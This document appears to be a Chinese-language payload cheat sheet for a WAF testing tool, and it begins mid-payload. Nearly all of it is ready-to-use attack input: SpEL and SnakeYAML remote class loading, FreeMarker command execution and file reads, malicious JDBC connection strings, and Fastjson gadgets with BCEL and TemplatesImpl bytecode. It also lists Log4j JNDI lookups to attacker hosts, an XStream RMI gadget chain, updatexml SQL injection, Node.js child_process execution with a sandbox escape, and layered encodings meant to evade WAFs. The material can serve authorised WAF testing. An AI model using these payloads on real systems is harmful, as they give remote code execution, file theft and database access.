WIUVcwy27tfukIShUkmLO2jf5Hk8d2gpsAlcv5petlCyN9GEhPtr4OpF2AaMZ/VEsxwnaLLDGqQICnU5r1YtBVtiB51oU7+8NJnQH8BZpcw9bZBS2VtajCd9ZpnwaKffg5WsXgv6DUGBSqYyNPbMI9fl9Xn3S9iLqDjs5ua7d3PUfo7r5BH9zRfJK8/rC/7tH5aKQLTqlAtwSaxhEX/3EVsfYQ/OFY9OIb9j2zRcN0Fr4aHyKOo89vhHftgSsDctW6091s0SfRasN+mw7vmo3Onk/i8S41XW4SWcDSJFBKaWHYtbSKaSXZNtpVCoZZC8jCKZKE0Sa23YurQicpGsaigMnqFCIWVS6TFUF90EYrypmYCsp5ec3Efgj399NNK57wDziKHs5jbZ/fRdhamXoT7tUSgEILHMAUmbW0R1xSMvUj7F8WVjvT3BjGw0QaOf3du49IiGWI5nMKJAAMI27tfhStwAlUcHSoq0zA1dQ1m//8ABntWk3AiAAA=')))),0327.getClass().forName('org.springframework.expression.ExpressionParser').getClassLoader(),null,0327.getClass().forName('org.springframework.expression.ExpressionParser'))}|__::.nu11

```

# SnakeYAML反序列化
```
dir=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["vps/yaml-payload.jar"]]]]


```




# freemarker 表达式注入
```


POC1:

<#assign classLoader=object?api.class.protectionDomain.classLoader> 
<#assign clazz=classLoader.loadClass("ClassExposingGSON")> 
<#assign field=clazz?api.getField("GSON")> 
<#assign gson=field?api.get(null)> 
<#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))> 
${ex("calc")}


POC2:

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","whoami").start()}


POC3:

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("open -a Calculator.app") }

POC4:

<#assign is=object?api.class.getResourceAsStream("/Test.class")>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]


POC5:

<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/xxxx").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]


```

# JDBC 反序列化
```
测试1:
jdbc:mysql://172.16.1.2:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root

测试2:
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\;}'\;CALL EXEC ('cmd /c calc')\;


测试3：
jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER UNAM4 BEFORE SELECT ON
INFORMATION_SCHEMA.TABLES AS $$ void UNAM4() throws Exception{ Runtime.getRuntime().exec("cmd /c calc")\;}$$

测试4:
jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=nulltjmMEdVUfP.xml


```

## jdbc
```
测试1:
127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=nulltjmMEdVUfP.xml


测试2:
172.16.1.2:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root
```


# BCEL 
```
$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$db$40$U$3d$938$b1c$9c$G$C$BZ$fa$I$ef$80$E$96$d8$82X$QQ$a9$aa$81$aaAt$3d$ZFa$c0$f1D$ce$E$c1$X$b1f$D$88$F$l$c0G$n$ee$98$94$o$VK$9e$fb$3c$e7$9e$3b$f3$f8t$ff$A$60$DK$3e$3cL$f9$98$c6G$P$9f$ac$9dq$f1$d9G$B_$5c$7cu$f1$8d$a1$b8$a5$Se$b6$Z$f2$8d$95$p$G$a7$a9$8f$rC$rR$89$dc$lt$db2$3d$e4$ed$982$d5H$L$k$l$f1T$d9x$98t$cc$89$ea3LE$7b$b2$ab$d3$cb$d6$89$8c$e3p$a7$b9$h$85$d4$x6$Z$bc$z$R$P$f9$Z$f5$d7$a2S$7e$ceC$a5$c3$l$H$bb$XB$f6$8c$d2$J$b5$95$5b$86$8b$b3$3d$de$cbxI$o$83$df$d2$83T$c8$ef$ca$ce$vY$bau$8b$NP$82$ef$a2$k$60$Ws$a4J$f7dR_$e3$f5$s5$Mbnt$g$60$k$L$M$e3$efL$K$b0$I$9fT$bc$ab$96a4$83$c4$3c$e9$84$H$edS$v$M$c3$d8$bf$d4$efAbT$97$c4$f8$ji$5e$83Zc$r$fa$af$876r$e4$85$q$ca$e5$c6$9bj$cb$a4$w$e9l$be$F$fcJ$b5$90$fd$3e$B$w$3d$w$9a$ec$k$OS$$$q$ed$e7$d2$e3$d9$_$Hf$b7$a6s$84$a2$90$y$p$5bX$bd$F$bb$ce$ca$B$9d$c5$97$q$cat$GC$ff$D$wd$3d$8c$be$82yF$GT$ef$90$ab$e6o$e0$fc$b9$82$f7s$f5$G$c5$eb$y_$ol$B$f9$8cq$92$3c$8b$$$R$d2$5e$7b$99X$c6$c8$fb$3b$a1$M$87$e2$wE$e3$f4$bb$c8E$$$s$i$w$d42Q$93$cfC$e1$98g$86$C$A$A
```


# Fastjson  Payload
```


{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "rmi://127.0.0.1:1099/Object", 
        "autoCommit": true
    }
}

```

```

{
    "a": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", 
        "_bytecodes": [
            "yv66vgAAADQALAcAAgEAGHBheWxvYWQvVGVtcGxhdGVzSW1wbGNtZAcABAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYBAApFeGNlcHRpb25zBwAJAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABENvZGUKAAMADAwABQAGCgAOABAHAA8BABFqYXZhL2xhbmcvUnVudGltZQwAEQASAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgAFAEABGNhbGMKAA4AFgwAFwAYAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABpMcGF5bG9hZC9UZW1wbGF0ZXNJbXBsY21kOwEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHACcBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsY21kLmphdmEAIQABAAMAAAAAAAMAAQAFAAYAAgAHAAAABAABAAgACgAAAEAAAgABAAAADiq3AAu4AA0SE7YAFVexAAAAAgAZAAAADgADAAAACgAEAAsADQAMABoAAAAMAAEAAAAOABsAHAAAAAEAHQAeAAEACgAAAEkAAAAEAAAAAbEAAAACABkAAAAGAAEAAAAPABoAAAAqAAQAAAABABsAHAAAAAAAAQAfACAAAQAAAAEAIQAiAAIAAAABACMAJAADAAEAHQAlAAIABwAAAAQAAQAmAAoAAAA/AAAAAwAAAAGxAAAAAgAZAAAABgABAAAAEgAaAAAAIAADAAAAAQAbABwAAAAAAAEAHwAgAAEAAAABACgAKQACAAEAKgAAAAIAKw=="
        ], 
        "_name": "aaa", 
        "_tfactory": { }, 
        "_outputProperties": { }
    }
}

```

```



{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
        }
    }: "x"
}


```

# Log4j2 反序列化 Payload
```java
id=${jndi:ldap://attacker.com/a}
id=${jndi:rmi://attacker.com/a}
id=${jndi:dns://attacker.com/a}
id=${${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s://${sys:java.version}.218.360.bzpm.amp80l.ceye.io/a}


```


# base64 JSP
```
    data:image/jsp;base64,PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuRGF0ZSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnRleHQuU2ltcGxlRGF0ZUZvcm1hdCIgJT4KPCUKICAgIERhdGUgbm93ID0gbmV3IERhdGUoKTsKICAgIFNpbXBsZURhdGVGb3JtYXQgc2RmID0gbmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTsKICAgIG91dC5wcmludGxuKCJDdXJyZW50IHN5c3RlbSB0aW1lOiAiICsgc2RmLmZvcm1hdChub3cpKTsKJT4=
```


# Xml 反序列化 Payload
```xml
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://192.168.10.6:1099/example</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

# 通过Kye 传递参数
```
/api/blade-log/error/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1

```

# 通过Cookie 传递参数
```
Cookie: JSESSIONID=updatexml(1,concat(0x7e,user(),0x7e),1)=1
```

# 通过Header 传递参数
```
CMD:updatexml(1,concat(0x7e,user(),0x7e),1)
```

# Nodejs 代码执行
```
命令执行
require('child_process').exec('ls -la /tmp', function(error, stdout, stderr) { console.log(stdout) });

global.process.mainModule.constructor._load('child_process').exec('calc');

Math=Math.constructor,
Math.constructor("return process.mainModule.require('child_process').execSync('dir').toString()")()



沙箱逃逸
Symbol = {
  get toStringTag(){
    throw f=>f.constructor("return process")()
  }
};
try{
  Buffer.from(new Map());
}catch(f){
  Symbol = {};
  f(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
}


```




# 多层编码 自动解码三层 WAF6.8 更新了这个功能
```
hex+base64+base64
原始字符串: phpinfo();  
-> 706870696e666f28293b
-> NzA2ODcwNjk2ZTY2NmYyODI5M2I= 
-> 4e7a41324f4463774e6a6b325a5459324e6d59794f4449354d32493d

最终的payload: 4e7a41324f4463774e6a6b325a5459324e6d59794f4449354d32493d


三层url编码
phpinfo()%25253B%252520


三层base64
WTBkb2QyRlhOVzFpZVdkd1QzYzlQUT09



支持的编码类型如下：
URL编码
hex编码
base64编码
Unicode编码

如果还需要支持那些编码可以提交issues


```

# Gzip 编码
```
ud=H4sIACj8I2kC%2FyvIKMjMS8vX0AQA5DkcsgkAAAA%3D
id=%1F%8B%08%00%28%FC%23i%02%FF%2B%C8%28%C8%CCK%CB%D7%D0%04%00%E49%1C%B2%09%00%00%00

```


# Key 注入方式
```
abc[phpinfo();//]=1
tel[tel') VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a]=1111

```



